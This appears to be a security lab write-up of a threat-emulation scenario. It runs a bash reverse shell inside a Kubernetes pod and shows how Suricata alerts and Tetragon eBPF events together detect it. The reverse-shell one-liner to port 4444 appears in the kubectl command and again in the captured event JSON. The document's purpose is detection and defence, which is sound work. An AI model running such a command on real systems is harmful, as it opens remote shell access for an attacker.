# Threat Emulation Scenario 3: Reverse Shell & Dual-Stack Validation

## The Threat
A reverse shell is a classic post-exploitation technique where an attacker forces a compromised server to establish an outbound connection back to their command-and-control (C2) server. This gives the attacker an interactive command line on the victim's machine.

Detecting a reverse shell requires correlating network activity (the outbound connection) with process execution (the shell being spawned). 

## The Execution
To emulate this, we executed a standard bash reverse shell payload inside the `nexus-workbench` pod, targeting a generic external IP:

```bash
kubectl exec -n soc nexus-workbench-5fd9bf9dc9-tjcdb -- bash -c 'bash -i >& /dev/tcp/8.8.8.8/4444 0>&1'
```

## The Detection (Dual-Stack Correlation)
This scenario demonstrates a **target** detection design that combines traditional network intrusion detection (Suricata) with kernel-native observability (Tetragon eBPF). That pairing aligns with the hybrid-sensor plan (ADR 0007); full Tetragon+gVisor rollout is architecture Phase 2+, not assumed present in every lab overlay.

### 1. The Network Signature (Suricata)
If configured with the standard Emerging Threats ruleset, Suricata instantly flags the anomalous outbound connection on port 4444 as a potential reverse shell attempt based on network signatures. However, network telemetry alone cannot tell us *which* process inside the container spawned the traffic.

### 2. The Process Telemetry (Tetragon eBPF)
Simultaneously, Tetragon captures the exact process execution at the kernel layer. Our `tetra getevents` stream output the exact execution chain, including the malicious `/dev/tcp` arguments:

```json
{
  "process_exec": {
    "process": {
      "pid": 307861,
      "uid": 65532,
      "binary": "/usr/bin/bash",
      "arguments": "-c \"bash -i >& /dev/tcp/8.8.8.8/4444 0>&1 & sleep 2\"",
      "flags": "execve",
      "pod": {
        "namespace": "soc",
        "name": "nexus-workbench-5fd9bf9dc9-tjcdb",
        "workload": "nexus-workbench"
      }
    }
  }
}
```

## Conclusion

Feeding Suricata alerts and Tetragon events into the AI-SOC enrichment path can
**support** correlation of network activity with the spawning process for analyst
review. That is **decision support**, not autonomous response: high-impact actions
remain human-approved (see `docs/00-ai-collaboration.md` §4). Do not assume
instantaneous or fully autonomous SOAR from this scenario.
